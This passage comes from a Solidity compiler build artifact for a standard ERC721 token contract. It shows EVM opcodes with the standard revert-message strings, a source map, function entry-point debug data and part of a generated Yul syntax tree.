PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4552433732313A2063616C6C6572206973206E6F7420746F6B656E206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x72206F7220617070726F76656400000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F206E6F6E204552433732315265 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x63656976657220696D706C656D656E7465720000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E736665722066726F6D20696E636F727265637420 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6F776E6572000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F20746865207A65726F20616464 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7265737300000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F766520746F2063616C6C657200000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A2061646472657373207A65726F206973206E6F742061207661 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6C6964206F776E65720000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20696E76616C696420746F6B656E2049440000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76616C20746F2063757272656E74206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7200000000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76652063616C6C6572206973206E6F7420746F PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6B656E206F776E6572206F7220617070726F76656420666F7220616C6C000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x2299 DUP2 PUSH2 0x1E1B JUMP JUMPDEST DUP2 EQ PUSH2 0x22A4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x22B0 DUP2 PUSH2 0x1E2D JUMP JUMPDEST DUP2 EQ PUSH2 0x22BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x22C7 DUP2 PUSH2 0x1E39 JUMP JUMPDEST DUP2 EQ PUSH2 0x22D2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x22DE DUP2 PUSH2 0x1E85 JUMP JUMPDEST DUP2 EQ PUSH2 0x22E9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD8 0xEE PUSH32 0xADA685F0B32F66DF66D6451CEA01150B5C19624F410F83018282EDC5BB64736F PUSH13 0x63430008070033000000000000 ","sourceMap":"628:16327:1:-:0;;;1390:113;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1464:5;1456;:13;;;;;;;;;;;;:::i;:::-;;1489:7;1479;:17;;;;;;;;;;;;:::i;:::-;;1390:113;;628:16327;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;:::o;7:421:15:-;96:5;121:66;137:49;179:6;137:49;:::i;:::-;121:66;:::i;:::-;112:75;;210:6;203:5;196:21;248:4;241:5;237:16;286:3;277:6;272:3;268:16;265:25;262:112;;;293:79;;:::i;:::-;262:112;383:39;415:6;410:3;405;383:39;:::i;:::-;102:326;7:421;;;;;:::o;448:355::-;515:5;564:3;557:4;549:6;545:17;541:27;531:122;;572:79;;:::i;:::-;531:122;682:6;676:13;707:90;793:3;785:6;778:4;770:6;766:17;707:90;:::i;:::-;698:99;;521:282;448:355;;;;:::o;809:853::-;908:6;916;965:2;953:9;944:7;940:23;936:32;933:119;;;971:79;;:::i;:::-;933:119;1112:1;1101:9;1097:17;1091:24;1142:18;1134:6;1131:30;1128:117;;;1164:79;;:::i;:::-;1128:117;1269:74;1335:7;1326:6;1315:9;1311:22;1269:74;:::i;:::-;1259:84;;1062:291;1413:2;1402:9;1398:18;1392:25;1444:18;1436:6;1433:30;1430:117;;;1466:79;;:::i;:::-;1430:117;1571:74;1637:7;1628:6;1617:9;1613:22;1571:74;:::i;:::-;1561:84;;1363:292;809:853;;;;;:::o;1668:129::-;1702:6;1729:20;;:::i;:::-;1719:30;;1758:33;1786:4;1778:6;1758:33;:::i;:::-;1668:129;;;:::o;1803:75::-;1836:6;1869:2;1863:9;1853:19;;1803:75;:::o;1884:308::-;1946:4;2036:18;2028:6;2025:30;2022:56;;;2058:18;;:::i;:::-;2022:56;2096:29;2118:6;2096:29;:::i;:::-;2088:37;;2180:4;2174;2170:15;2162:23;;1884:308;;;:::o;2198:307::-;2266:1;2276:113;2290:6;2287:1;2284:13;2276:113;;;2375:1;2370:3;2366:11;2360:18;2356:1;2351:3;2347:11;2340:39;2312:2;2309:1;2305:10;2300:15;;2276:113;;;2407:6;2404:1;2401:13;2398:101;;;2487:1;2478:6;2473:3;2469:16;2462:27;2398:101;2247:258;2198:307;;;:::o;2511:320::-;2555:6;2592:1;2586:4;2582:12;2572:22;;2639:1;2633:4;2629:12;2660:18;2650:81;;2716:4;2708:6;2704:17;2694:27;;2650:81;2778:2;2770:6;2767:14;2747:18;2744:38;2741:84;;;2797:18;;:::i;:::-;2741:84;2562:269;2511:320;;;:::o;2837:281::-;2920:27;2942:4;2920:27;:::i;:::-;2912:6;2908:40;3050:6;3038:10;3035:22;3014:18;3002:10;2999:34;2996:62;2993:88;;;3061:18;;:::i;:::-;2993:88;3101:10;3097:2;3090:22;2880:238;2837:281;;:::o;3124:180::-;3172:77;3169:1;3162:88;3269:4;3266:1;3259:15;3293:4;3290:1;3283:15;3310:180;3358:77;3355:1;3348:88;3455:4;3452:1;3445:15;3479:4;3476:1;3469:15;3496:117;3605:1;3602;3595:12;3619:117;3728:1;3725;3718:12;3742:117;3851:1;3848;3841:12;3865:117;3974:1;3971;3964:12;3988:102;4029:6;4080:2;4076:7;4071:2;4064:5;4060:14;4056:28;4046:38;;3988:102;;;:::o;628:16327:1:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@_afterTokenTransfer_997":{"entryPoint":4788,"id":997,"parameterSlots":4,"returnSlots":0},"@_approve_830":{"entryPoint":2576,"id":830,"parameterSlots":2,"returnSlots":0},"@_baseURI_267":{"entryPoint":4190,"id":267,"parameterSlots":0,"returnSlots":1},"@_beforeTokenTransfer_984":{"entryPoint":4494,"id":984,"parameterSlots":4,"returnSlots":0},"@_checkOnERC721Received_938":{"entryPoint":4794,"id":938,"parameterSlots":4,"returnSlots":1},"@_exists_499":{"entryPoint":4429,"id":499,"parameterSlots":1,"returnSlots":1},"@_isApprovedOrOwner_533":{"entryPoint":2761,"id":533,"parameterSlots":2,"returnSlots":1},"@_msgSender_1501":{"entryPoint":2568,"id":1501,"parameterSlots":0,"returnSlots":1},"@_ownerOf_481":{"entryPoint":3672,"id":481,"parameterSlots":1,"returnSlots":1},"@_requireMinted_876":{"entryPoint":2493,"id":876,"parameterSlots":1,"returnSlots":0},"@_safeTransfer_468":{"entryPoint":4098,"id":468,"parameterSlots":4,"returnSlots":0},"@_setApprovalForAll_862":{"entryPoint":3733,"id":862,"parameterSlots":3,"returnSlots":0},"@_transfer_806":{"entryPoint":2910,"id":806,"parameterSlots":3,"returnSlots":0},"@approve_310":{"entryPoint":1142,"id":310,"parameterSlots":2,"returnSlots":0},"@balanceOf_171":{"entryPoint":1685,"id":171,"parameterSlots":1,"returnSlots":1},"@getApproved_328":{"entryPoint":1072,"id":328,"parameterSlots":1,"returnSlots":1},"@isApprovedForAll_363":{"entryPoint":2239,"id":363,"parameterSlots":2,"returnSlots":1},"@isContract_1177":{"entryPoint":5540,"id":1177,"parameterSlots":1,"returnSlots":1},"@log10_2424":{"entryPoint":5201,"id":2424,"parameterSlots":1,"returnSlots":1},"@name_209":{"entryPoint":926,"id":209,"parameterSlots":0,"returnSlots":1},"@ownerOf_199":{"entryPoint":1550,"id":199,"parameterSlots":1,"returnSlots":1},"@safeTransferFrom_409":{"entryPoint":1518,"id":409,"parameterSlots":3,"returnSlots":0},"@safeTransferFrom_439":{"entryPoint":2037,"id":439,"parameterSlots":4,"returnSlots":0},"@setApprovalForAll_345":{"entryPoint":2015,"id":345,"parameterSlots":2,"returnSlots":0},"@supportsInterface_147":{"entryPoint":700,"id":147,"parameterSlots":1,"returnSlots":1},"@supportsInterface_1709":{"entryPoint":2387,"id":1709,"parameterSlots":1,"returnSlots":1},"@symbol_219":{"entryPoint":1869,"id":219,"parameterSlots":0,"returnSlots":1},"@toString_1569":{"entryPoint":4213,"id":1569,"parameterSlots":1,"returnSlots":1},"@tokenURI_258":{"entryPoint":2135,"id":258,"parameterSlots":1,"returnSlots":1},"@transferFrom_390":{"entryPoint":1422,"id":390,"parameterSlots":3,"returnSlots":0},"abi_decode_available_length_t_bytes_memory_ptr":{"entryPoint":5575,"id":null,"parameterSlots":3,"returnSlots":1},"abi_decode_t_address":{"entryPoint":5641,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bool":{"entryPoint":5662,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4":{"entryPoint":5683,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4_fromMemory":{"entryPoint":5704,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes_memory_ptr":{"entryPoint":5725,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256":{"entryPoint":5771,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":5792,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_addresst_address":{"entryPoint":5837,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_addresst_uint256":{"entryPoint":5901,"id":null,"parameterSlots":2,"returnSlots":3},"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr":{"entryPoint":5984,"id":null,"parameterSlots":2,"returnSlots":4},"abi_decode_tuple_t_addresst_bool":{"entryPoint":6115,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_uint256":{"entryPoint":6179,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_bytes4":{"entryPoint":6243,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_bytes4_fromMemory":{"entryPoint":6288,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256":{"entryPoint":6333,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":6378,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bool_to_t_bool_fromStack":{"entryPoint":6393,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack":{"entryPoint":6408,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack":{"entryPoint":6465,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":6522,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack":{"entryPoint":6571,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack":{"entryPoint":6606,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack":{"entryPoint":6641,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack":{"entryPoint":6676,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack":{"entryPoint":6711,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack":{"entryPoint":6746,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack":{"entryPoint":6781,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack":{"entryPoint":6816,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack":{"entryPoint":6851,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":6886,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_packed_t_string_memory_ptr_t_string_memory_ptr__to_t_string_memory_ptr_t_string_memory_ptr__nonPadded_inplace_fromStack_reversed":{"entryPoint":6901,"id":null,"parameterSlots":3,"returnSlots":1},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":6937,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed":{"entryPoint":6964,"id":null,"parameterSlots":5,"returnSlots":1},"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed":{"entryPoint":7040,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7067,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7101,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7133,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7165,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7197,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7229,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7261,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7293,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7325,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7357,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":7389,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_memory":{"entryPoint":7416,"id":null,"parameterSlots":1,"returnSlots":1},"allocate_unbounded":{"entryPoint":7443,"id":null,"parameterSlots":0,"returnSlots":1},"array_allocation_size_t_bytes_memory_ptr":{"entryPoint":7453,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_bytes_memory_ptr":{"entryPoint":7502,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":7513,"id":null,"parameterSlots":1,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack":{"entryPoint":7524,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":7541,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":7558,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":7569,"id":null,"parameterSlots":2,"returnSlots":1},"checked_sub_t_uint256":{"entryPoint":7655,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":7707,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bool":{"entryPoint":7725,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bytes4":{"entryPoint":7737,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":7781,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":7813,"id":null,"parameterSlots":1,"returnSlots":1},"copy_calldata_to_memory":{"entryPoint":7823,"id":null,"parameterSlots":3,"returnSlots":0},"copy_memory_to_memory":{"entryPoint":7838,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":7889,"id":null,"parameterSlots":1,"returnSlots":1},"finalize_allocation":{"entryPoint":7939,"id":null,"parameterSlots":2,"returnSlots":0},"panic_error_0x11":{"entryPoint":7988,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x12":{"entryPoint":8035,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x22":{"entryPoint":8082,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":8129,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d":{"entryPoint":8176,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae":{"entryPoint":8181,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":8186,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":8191,"id":null,"parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":8196,"id":null,"parameterSlots":1,"returnSlots":1},"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af":{"entryPoint":8213,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e":{"entryPoint":8292,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48":{"entryPoint":8371,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4":{"entryPoint":8450,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05":{"entryPoint":8529,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159":{"entryPoint":8570,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f":{"entryPoint":8649,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942":{"entryPoint":8690,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83":{"entryPoint":8769,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_address":{"entryPoint":8848,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bool":{"entryPoint":8871,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_bytes4":{"entryPoint":8894,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":8917,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:23861:15","statements":[{"body":{"nodeType":"YulBlock","src":"90:327:15","statements":[{"nodeType":"YulAssignment","src":"100:74:15","value":{"arguments":[{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"166:6:15"}],"functionName":{"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"125:40:15"},"nodeType":"YulFunctionCall","src":"125:48:15"}],"functionName":{"name":"allocate_memory","nodeType":"YulIdentifier","src":"109:15:15"},"nodeType":"YulFunctionCall","src":"109:65:15"},"variableNames":[{"name":"array","nodeType":"YulIdentifier","src":"100:5:15"}]},{"expression":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"190:5:15"},{"name":"length","nodeType":"YulIdentifier","src":"197:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"183:6:15"},"nodeType":"YulFunctionCall","src":"183:21:15"},"nodeType":"YulExpressionStatement","src":"183:21:15"},{"nodeType":"YulVariableDeclaration","src":"213:27:15","value":{"arguments":[{"name":"array","nodeType":"YulIdentifier","src":"228:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"235:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"224:3:15"},"nodeType":"YulFunctionCall","src":"224:16:15"},"variables":[{"name":"dst","nodeType":"YulTypedName","src":"217:3:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"278:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulIdentifier","src":"280:77:15"},"nodeType":"YulFunctionCall","src":"280:79:15"},"nodeType":"YulExpressionStatement","src":"280:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"259:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"264:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"255:3:15"},"nodeType":"YulFunctionCall","src":"255:16:15"},{"name":"end","nodeType":"YulIdentifier","src":"273:3:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"252:2:15"},"nodeType":"YulFunctionCall","src":"252:25:15"},"nodeType":"YulIf","src":"249:112:15"},{"expression":{"arguments":[{"name":"src","nodeType":"YulIdentifier","src":"394:3:15"},{"name":"dst","nodeType":"YulIdentifier","src":"399:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"404:6:15"}],"functionName":{"name":"copy_calldata_to_memory","nodeType":"YulIdentifier","src":"370:23:15"},"nodeType":"YulFunctionCall","src":"370:41:15"},"nodeType":"YulExpressionStatement","src":"370:41:15"}]},"name":"abi_decode_available_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nodeType":"YulTypedName","src":"63:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"68:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"76:3:15","type":""}],"returnVariables":[{"name":"array","nodeType":"YulTypedName","src":"84:5:15","type":""}],"src":"7:410:15"},{"body":{"nodeType":"YulBlock","src":"475:87:15","statements":[{"nodeType":"YulAssignment","src":"485:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"507:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"494:12:15"},"nodeType":"YulFunctionCall","src":"494:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"485:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"550:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"523:26:15"},"nodeType":"YulFunctionCall","src":"523:33:15"},"nodeType":"YulExpressionStatement","src":"523:33:15"}]},"name":"abi_decode_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"453:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"461:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"469:5:15","type":""}],"src":"423:139:15"},{"body":{"nodeType":"YulBlock","src":"617:84:15","statements":[{"nodeType":"YulAssignment","src":"627:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"649:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"636:12:15"},"nodeType":"YulFunctionCall","src":"636:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"627:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"689:5:15"}],"functionName":{"name":"validator_revert_t_bool","nodeType":"YulIdentifier","src":"665:23:15"},"nodeType":"YulFunctionCall","src":"665:30:15"},"nodeType":"YulExpressionStatement","src":"665:30:15"}]},"name":"abi_decode_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"595:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"603:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"611:5:15","type":""}],"src":"568:133:15"},{"body":{"nodeType":"YulBlock","src":"758:86:15","statements":[{"nodeType":"YulAssignment","src":"768:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"790:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"777:12:15"},"nodeType":"YulFunctionCall","src":"777:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"768:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"832:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"806:25:15"},"nodeType":"YulFunctionCall","src":"806:32:15"},"nodeType":"YulExpressionStatement","src":"806:32:15"}]},"name":"abi_decode_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"736:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"744:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"752:5:15","type":""}],"src":"707:137:15"},{"body":{"nodeType":"YulBlock","src":"912:79:15","statements":[{"nodeType":"YulAssignment","src":"922:22:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"937:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"931:5:15"},"nodeType":"YulFunctionCall","src":"931:13:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"922:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"979:5:15"}],"functionName":{"name":"validator_revert_t_bytes4","nodeType":"YulIdentifier","src":"953:25:15"},"nodeType":"YulFunctionCall","src":"953:32:15"},"nodeType":"YulExpressionStatement","src":"953:32:15"}]},"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"890:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"898:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"906:5:15","type":""}],"src":"850:141:15"},{"body":{"nodeType":"YulBlock","src":"1071:277:15","statements":[{"body":{"nodeType":"YulBlock","src":"1120:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7f